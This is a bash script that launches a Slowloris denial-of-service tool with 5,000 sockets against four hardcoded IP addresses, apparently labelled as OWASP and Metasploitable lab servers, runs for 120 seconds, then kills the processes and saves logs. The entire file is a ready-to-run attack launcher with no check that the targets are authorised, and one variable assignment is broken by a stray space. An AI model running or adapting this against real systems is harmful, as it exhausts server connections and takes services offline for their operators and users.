#!/bin/bash
# Multi-server Slowloris attack with auto-stop and logging

# Target IPs or hostnames
OWASP_SERVER="41.203.208.129"
METASPLOIT_SERVER="197.248.128.1"
SAMPLE_SERVER="197.248.128.2"
SIMPLE_SAMPLE= "41.203.208.130"

# Attack parameters
SOCKETS=5000
SLEEPTIME=10
VERBOSE="--verbose"
RAND_UA="--randuseragents"

# Test duration (in seconds)
TEST_DURATION=120

# Log directory
LOGDIR="./slowloris_logs"
mkdir -p $LOGDIR

# Start attacks
echo "[*] Attacking server1..."
python3 enhanced_slowloris.py $OWASP_SERVER -s $SOCKETS --sleeptime $SLEEPTIME $VERBOSE $RAND_UA > $LOGDIR/owasp.log 2>&1 &
PID1=$!

sleep 5

echo "[*] Attacking server2..."
python3 enhanced_slowloris.py $METASPLOIT_SERVER -s $SOCKETS --sleeptime $SLEEPTIME $VERBOSE $RAND_UA > $LOGDIR/metasploit.log 2>&1 &
PID2=$!

sleep 5

echo "[*] Attacking  server3..."
python3 enhanced_slowloris.py $SAMPLE_SERVER -s $SOCKETS --sleeptime $SLEEPTIME $VERBOSE $RAND_UA > $LOGDIR/sample.log 2>&1 &
PID3=$!

sleep 5
echo "[*] Attacking  server3..."
python3 enhanced_slowloris.py $SIMPLE_SAMPLE -s $SOCKETS --sleeptime $SLEEPTIME $VERBOSE $RAND_UA > $LOGDIR/simple2.log 2>&1 &
PID4=$!


# Wait and stop
echo "[*] Test running for $TEST_DURATION seconds..."
sleep $TEST_DURATION

echo "[*] Stopping all slowloris processes..."
kill $PID1 $PID2 $PID3 $PID4

echo "[*] Logs saved in $LOGDIR/"
